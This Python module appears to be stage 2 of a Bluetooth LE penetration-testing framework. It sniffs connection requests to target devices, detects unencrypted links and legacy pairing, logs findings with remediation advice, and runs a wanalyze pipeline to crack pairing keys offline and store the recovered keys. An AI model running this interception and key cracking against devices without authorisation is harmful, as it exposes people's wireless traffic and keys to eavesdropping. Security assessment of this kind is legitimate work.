from __future__ import annotations

import json
import shutil
import subprocess
from datetime import datetime, timezone
from pathlib import Path
from time import time

from scapy.layers.bluetooth4LE import (
    BTLE,
    BTLE_ADV,
    BTLE_CONNECT_REQ,
    BTLE_DATA,
    BTLE_CTRL,
)

from whad.ble.sniffing import ConnectionConfiguration

from core.dongle import WhadDongle
from core.models import Target, Connection, Finding
from core.db import insert_connection, insert_finding
from core.logger import get_logger
from core.pcap import pcap_path, attach_monitor, detach_monitor
import config

log = get_logger("s2_intel")


def run(
    dongle: WhadDongle,
    targets: list[Target],
    engagement_id: str,
) -> list[Connection]:
    target_addrs = {t.bd_address.upper() for t in targets}
    connections: list[Connection] = []

    log.info(
        f"Sniffing connection requests for {config.CONN_SNIFF_DURATION}s "
        f"targeting {len(target_addrs)} device(s)"
    )

    sniffer = dongle.sniffer()
    sniffer.configure(advertisements=True)
    _monitor = None
    _s2_pcap: Path | None = None
    if targets:
        _s2_pcap = pcap_path(engagement_id, 2, targets[0].bd_address)
        _monitor = attach_monitor(sniffer, _s2_pcap)
    sniffer.start()

    start_ts = time()

    try:
        while time() - start_ts < config.CONN_SNIFF_DURATION:
            remaining = config.CONN_SNIFF_DURATION - (time() - start_ts)
            if remaining <= 0:
                break

            msg = dongle.sniff_next(sniffer, timeout=min(remaining, 2.0))
            if msg is None:
                continue

            pkt = msg if isinstance(msg, BTLE) else None
            if pkt is None:
                try:
                    pkt = BTLE(bytes(msg))
                except Exception:
                    continue

            conn_ind = pkt.getlayer(BTLE_CONNECT_REQ)
            if conn_ind is None:
                continue

            init_a = str(conn_ind.InitA).upper()
            adv_a = str(conn_ind.AdvA).upper()

            if config.TARGET_FILTER and adv_a not in config.TARGET_FILTER:
                continue
            if adv_a not in target_addrs and not config.TARGET_FILTER:
                continue

            aa = conn_ind.AA
            crc_init = conn_ind.crc_init
            win_size = conn_ind.win_size
            win_offset = conn_ind.win_offset
            interval = conn_ind.interval
            latency = conn_ind.latency
            timeout_val = conn_ind.timeout
            chM = conn_ind.chM
            hop = conn_ind.hop

            interval_ms = interval * 1.25
            ch_map_hex = f"{chM:010x}"

            log.info(
                f"CONNECT_IND captured: "
                f"{init_a} -> {adv_a}  "
                f"AA=0x{aa:08X}  "
                f"interval={interval_ms:.1f}ms  "
                f"hop={hop}  "
                f"chMap={ch_map_hex}"
            )

            encrypted = False
            legacy_pairing = False
            plaintext_data = False
            data_pcap = None

            try:
                follow_result = _follow_connection(
                    dongle, sniffer, aa, crc_init, chM, hop, interval
                )
                encrypted = follow_result["encrypted"]
                legacy_pairing = follow_result["legacy_pairing"]
                plaintext_data = follow_result["plaintext_data"]
                data_pcap = follow_result.get("pcap_path")
            except Exception as exc:
                log.debug(f"Connection follow failed: {exc}")

            conn = Connection(
                central_addr=init_a,
                peripheral_addr=adv_a,
                access_address=aa,
                crc_init=crc_init,
                interval_ms=interval_ms,
                channel_map=ch_map_hex,
                hop_increment=hop,
                encrypted=encrypted,
                legacy_pairing_observed=legacy_pairing,
                pairing_pcap_path=str(_s2_pcap) if (legacy_pairing and _s2_pcap) else None,
                plaintext_data_captured=plaintext_data,
                data_pcap_path=data_pcap,
                timestamp=datetime.now(timezone.utc),
                engagement_id=engagement_id,
            )
            connections.append(conn)
            insert_connection(conn)
            _evaluate_findings(conn, engagement_id)

            log.info(
                f"Connection logged: encrypted={encrypted}  "
                f"legacy_pairing={legacy_pairing}  "
                f"plaintext_data={plaintext_data}"
            )

    except KeyboardInterrupt:
        log.info("Connection sniffing interrupted by user.")
    finally:
        try:
            detach_monitor(_monitor)
            sniffer.stop()
        except Exception:
            pass

    _print_summary(connections)

    if _s2_pcap is not None and _s2_pcap.exists():
        for conn in connections:
            if conn.legacy_pairing_observed:
                _crack_pairing_keys(conn, str(_s2_pcap), engagement_id)

    return connections


def _follow_connection(
    dongle: WhadDongle, sniffer, aa, crc_init, ch_map, hop, interval
):
    result = {
        "encrypted": False,
        "legacy_pairing": False,
        "plaintext_data": False,
        "pcap_path": None,
    }

    try:
        conn_cfg = ConnectionConfiguration(
            access_address=aa,
            crc_init=crc_init,
            channel_map=ch_map,
            hop_increment=hop,
            hop_interval=interval,
        )
        sniffer.configure(active_connection=conn_cfg)
    except Exception as exc:
        log.debug(
            f"Device does not support active connection sniffing: {exc}"
        )
        return result

    deadline = time() + 10.0
    pdu_count = 0

    while time() < deadline:
        remaining = deadline - time()
        if remaining <= 0:
            break

        msg = dongle.sniff_next(sniffer, timeout=min(remaining, 1.0))
        if msg is None:
            continue

        pkt = msg if isinstance(msg, BTLE) else None
        if pkt is None:
            try:
                pkt = BTLE(bytes(msg))
            except Exception:
                continue

        data_layer = pkt.getlayer(BTLE_DATA)
        if data_layer is None:
            continue

        pdu_count += 1
        raw = bytes(data_layer.payload)

        if _is_enc_req(raw):
            result["encrypted"] = True
            log.debug("LL_ENC_REQ detected")
        elif _is_smp_pairing_req(raw) and _is_legacy_pairing(raw):
            result["legacy_pairing"] = True
            log.debug("Legacy SMP pairing request detected")

        if not result["encrypted"] and pdu_count > 5:
            result["plaintext_data"] = True

    if pdu_count > 0 and not result["encrypted"]:
        result["plaintext_data"] = True

    return result


def _is_enc_req(payload: bytes) -> bool:
    if len(payload) < 1:
        return False
    return payload[0] == 0x03


def _is_smp_pairing_req(payload: bytes) -> bool:
    if len(payload) < 6:
        return False
    l2cap_cid = int.from_bytes(payload[2:4], "little") if len(payload) >= 4 else 0
    return l2cap_cid == 0x0006


def _is_legacy_pairing(payload: bytes) -> bool:
    if len(payload) < 8:
        return False
    smp_offset = 4
    if smp_offset < len(payload):
        smp_code = payload[smp_offset]
        if smp_code == 0x01 and len(payload) > smp_offset + 4:
            auth_req = payload[smp_offset + 4]
            sc_flag = (auth_req >> 3) & 1
            return sc_flag == 0
    return False


def _evaluate_findings(conn: Connection, engagement_id: str) -> None:
    if not conn.encrypted and conn.plaintext_data_captured:
        finding = Finding(
            type="plaintext_data",
            severity="high",
            target_addr=conn.peripheral_addr,
            description=(
                f"Connection between {conn.central_addr} and "
                f"{conn.peripheral_addr} transmits data without "
                f"encryption. All GATT traffic is observable."
            ),
            remediation=(
                "Enable LE Secure Connections pairing with "
                "MITM protection. Require encrypted link for "
                "all characteristic access."
            ),
            evidence={
                "central_addr": conn.central_addr,
                "peripheral_addr": conn.peripheral_addr,
                "access_address": conn.access_address,
                "interval_ms": conn.interval_ms,
            },
            engagement_id=engagement_id,
        )
        insert_finding(finding)
        log.info(
            f"FINDING [high] plaintext_data: "
            f"{conn.peripheral_addr}"
        )

    if conn.legacy_pairing_observed:
        finding = Finding(
            type="weak_pairing",
            severity="critical",
            target_addr=conn.peripheral_addr,
            description=(
                f"Legacy BLE pairing observed between "
                f"{conn.central_addr} and {conn.peripheral_addr}. "
                f"Vulnerable to passive eavesdropping and offline "
                f"key recovery via CrackLE."
            ),
            remediation=(
                "Upgrade to LE Secure Connections (LESC) pairing. "
                "Legacy JustWorks pairing provides zero protection "
                "against passive attackers."
            ),
            evidence={
                "central_addr": conn.central_addr,
                "peripheral_addr": conn.peripheral_addr,
                "access_address": conn.access_address,
                "crackle_command": (
                    f"crackle -i capture.pcap"
                ),
            },
            engagement_id=engagement_id,
        )
        insert_finding(finding)
        log.info(
            f"FINDING [critical] weak_pairing: "
            f"{conn.peripheral_addr}"
        )


def _crack_pairing_keys(
    conn: Connection,
    pcap: str,
    engagement_id: str,
) -> None:
    """Run wplay | wanalyze legacy_pairing_cracking and record extracted keys.

    Args:
        conn: Connection with legacy_pairing_observed=True.
        pcap: Path to the PCAP file captured by the S2 sniffer.
        engagement_id: Engagement ID for Finding storage.
    """
    if not shutil.which("wplay") or not shutil.which("wanalyze"):
        log.warning("[S2] wplay/wanalyze not in PATH — skipping key extraction.")
        return

    cmd = f"wplay --flush {pcap} ble | wanalyze --json legacy_pairing_cracking"
    log.info(f"[S2] Running pairing crack: {cmd}")

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60,
        )
        keys = _parse_wanalyze_output(result.stdout)
    except subprocess.TimeoutExpired:
        log.warning("[S2] wanalyze timed out after 60s.")
        return
    except Exception as exc:
        log.error(f"[S2] wanalyze error: {type(exc).__name__}: {exc}")
        return

    if not keys:
        log.info("[S2] wanalyze: no keys extracted (capture may be incomplete).")
        return

    log.info(f"[S2] Pairing keys extracted: {list(keys.keys())}")

    finding = Finding(
        type="pairing_key_extracted",
        severity="critical",
        target_addr=conn.peripheral_addr,
        description=(
            f"Legacy BLE pairing between {conn.central_addr} and "
            f"{conn.peripheral_addr} cracked offline. "
            f"Keys extracted: {list(keys.keys())}. "
            "All session traffic can now be decrypted with wsniff -d -k <KEY>."
        ),
        remediation=(
            "Upgrade to LE Secure Connections (LESC). Legacy JustWorks and "
            "passkey entry are vulnerable to offline STK recovery. "
            "Rotate any credentials or sensitive data exchanged over this link."
        ),
        evidence={
            "keys": keys,
            "pcap_path": pcap,
            "central": conn.central_addr,
            "peripheral": conn.peripheral_addr,
            "crack_command": cmd,
        },
        pcap_path=pcap,
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(
        f"FINDING [critical] pairing_key_extracted: {conn.peripheral_addr}"
    )


def _parse_wanalyze_output(stdout: str) -> dict[str, str]:
    """Extract BLE key fields from wanalyze --json output.

    Returns empty dict if output is not JSON or contains no recognised keys.

    NOTE: Verify key names against a real capture before relying on this.
    Common wanalyze legacy_pairing_cracking fields: stk, ltk, rand, ediv, irk, csrk.
    """
    if not stdout.strip():
        return {}
    try:
        data = json.loads(stdout.strip())
        if not isinstance(data, dict):
            return {}
        key_fields = ("stk", "ltk", "rand", "ediv", "irk", "csrk")
        return {k: str(v) for k, v in data.items() if k in key_fields and v}
    except json.JSONDecodeError as exc:
        log.debug(f"wanalyze non-JSON output: {exc}. Raw: {stdout[:200]}")
        return {}


def _print_summary(connections: list[Connection]) -> None:
    from core.db import get_targets
    
    if not connections:
        print("\n" + "─" * 76)
        print("  STAGE 2 SUMMARY -- 0 connections captured")
        print("─" * 76)
        print("  No CONNECT_IND PDUs observed during sniff window.")
        print("─" * 76)
        return

    eng_id = connections[0].engagement_id
    targets_db = get_targets(eng_id)
    targets_by_addr = {
        t["bd_address"]: t["name"]
        for t in targets_db
    }

    print("\n" + "─" * 80)
    print(f"  STAGE 2 SUMMARY -- {len(connections)} connection(s) captured")
    print("─" * 80)
    print(f"  {'CENTRAL':<20} {'PERIPHERAL':<20} {'ACCESS ADDR':<10}  E L P  DEVICE NAME")
    print("─" * 80)
    for c in connections:
        periph_name = (targets_by_addr.get(c.peripheral_addr) or "—")[:14]
        enc  = "Y" if c.encrypted else "N"
        lgcy = "Y" if c.legacy_pairing_observed else "N"
        pln  = "Y" if c.plaintext_data_captured else "N"
        print(
            f"  {c.central_addr:<20} {c.peripheral_addr:<20} "
            f"0x{c.access_address:08X}  {enc} {lgcy} {pln}  {periph_name}"
        )
    print("─" * 80 + "\n")